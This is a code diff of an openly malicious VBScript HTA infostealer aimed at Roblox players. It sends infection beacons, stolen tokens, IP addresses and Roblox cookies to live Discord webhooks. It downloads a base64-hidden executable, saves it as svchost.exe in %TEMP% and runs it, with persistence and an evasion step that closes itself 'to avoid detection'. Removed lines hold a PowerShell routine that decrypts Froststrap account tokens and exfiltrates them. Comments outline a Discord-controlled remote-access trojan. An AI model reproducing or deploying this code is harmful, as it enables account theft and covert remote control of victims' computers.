@@ -10,50 +10,84 @@ Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' LOGS WEBHOOK
+' C2 WEBHOOK (Commands / Responses)
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-' RE-GRAB WEBHOOK
+' EXFIL WEBHOOK (Logs / Drops)
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. GRABS (LOGS CHANNEL) ---
+' --- 1. INITIAL GRABS ---
+Call PostEmbedTo(":satellite: New Infection", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
+
+' --- 2. PERSISTENCE ---
 Call Persistence
 
-' --- 2. AVATAR UI + COOKIE (LOGS CHANNEL) ---
-Call SendAvatarUI(WH)
-
-' --- 3. RAT DROP (LOGS CHANNEL) ---
+' --- 3. DROP RAT 1 (The C2 Bot Agent) ---
 Call DropRAT(WH, True)
+Call DropRAT(RE_WH, False)
 
-' --- 4. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
+' --- 4. INTERACTIVE LOOP (Keep HTA alive to process initial commands, then let the dropped RAT take over) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 10181046, RE_WH)
+    Call PostEmbedTo(":repeat: Stage 1 Heartbeat", "PC: " & PC & " | Cycle: " & runCount, 10181046, RE_WH)
     
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    Call GrabFroststrap(RE_WH)
     
-    Call DropRAT(RE_WH, False)
+    Call SleepSeconds(60)
     
-    Call SleepSeconds(150)
+    ' After 3 cycles, the dropped RAT should be active. We close the HTA to avoid detection.
+    If runCount >= 3 Then Exit Do
 Loop
 
 window.close()
 
-' --- SIMPLE AVATAR UI ---
+' --- RAT DROP ---
+Sub DropRAT(targetWH, sendRocket)
+    ' Base64 encoded URL for your C2 Agent (replace with your actual .exe or .ps1 agent)
+    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
+    Dim dl : dl = DecodeB64(b64Url)
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
+    Dim op : op = tPath & "\svchost.exe"
+    
+    If sendRocket Then
+        Call PostEmbedTo(":rocket: Agent Download Initiated", "Fetching secondary payload...", 10181046, targetWH)
+    End If
+
+    If fso.FileExists(op) Then fso.DeleteFile op, True
+
+    Dim cCmd : cCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """"
+    sh.Run cCmd, 0, True
+
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 100000 Then
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: Agent Dropped", "Executing secondary payload.", 10181046, targetWH)
+            Call RunCmd("""" & op & """")
+        End If
+    End If
+End Sub
+
+' --- DISCORD BOT AGENT ARCHITECTURE ---
+' The dropped RAT (secondary payload) should be a Python/PowerShell/C++ agent that:
+' 1. Connects to Discord Gateway via Bot Token.
+' 2. Listens to a specific channel for commands (!screenshot, !webcam, !shell <cmd>, etc.).
+' 3. Validates the command matches the target PC name.
+' 4. Executes the action and posts the result (image, text, file) back to the webhook.
+'
+' You need to write the agent code (Python w/ discord.py is easiest) and host the .exe/script.
+
+' --- SIMPLE AVATAR UI + COOKIE ---
 Sub SendAvatarUI(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
 
-    ' Try to get the real avatar if we have a cookie
     If Len(cookie) > 50 Then
         On Error Resume Next
         Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -85,7 +119,7 @@ Sub SendAvatarUI(targetWH)
     End If
 
     Dim DQ : DQ = Chr(34)
-    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
+    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Target Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
                 DQ & "title" & DQ & ":" & DQ & "Roblox Avatar" & DQ & "," & _
                 DQ & "color" & DQ & ":10181046," & _
                 DQ & "image" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}}]}"
@@ -97,42 +131,16 @@ Sub SendAvatarUI(targetWH)
     h.Send j
     Set h = Nothing
 
-    ' Send Cookie Embed right after
     If Len(cookie) > 0 Then
         Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
     End If
 End Sub
 
-' --- PostCookieOnly (For Re-grab) ---
+' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
     Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
-End Sub
-
-' --- RAT DROP ---
-Sub DropRAT(targetWH, sendRocket)
-    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
-    Dim dl : dl = DecodeB64(b64Url)
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
-    Dim op : op = tPath & "\agent.exe"
-    
-    If sendRocket Then
-        Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
-    End If
-
-    If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    Dim cCmd : cCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """"
-    sh.Run cCmd, 0, True
-
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
-            Dim desc : desc = "RAT launched successfully"
-            Call PostEmbedTo(":white_check_mark: RAT Downloaded", desc, 10181046, targetWH)
-            Call RunCmd("""" & op & """")
-        End If
-    End If
 End Sub
 
 ' --- GetRobloxCookie ---
@@ -249,23 +257,6 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- GrabFroststrap Function ---
-Sub GrabFroststrap(targetWH)
-    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
-    If Not fso.FileExists(fp) Then
-        On Error Resume Next
-        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
-        On Error Goto 0
-        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
-    End If
-    If Not fso.FileExists(fp) Then Exit Sub
-
-    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
-    Dim ps
-    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
-    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
-End Sub
-
 ' --- Sleep Functions ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
@@ -356,23 +347,6 @@ Sub PostEmbedTo(t, d, c, target_wh)
     h.Open "POST", target_wh, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
-    Set h = Nothing
-End Sub
-
-' --- PostFileTo ---
-Sub PostFileTo(fn, ct, target_wh, desc)
-    Dim DQ: DQ = Chr(34)
-    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    
-    Dim payloadTxt : payloadTxt = "{" & DQ & "content" & DQ & ": " & DQ & Ej(desc) & DQ & "}"
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "payload_json" & DQ & vbCrLf & vbCrLf & payloadTxt & vbCrLf & _
-                    "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", target_wh, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
-    h.Send bd
     Set h = Nothing
 End Sub
 
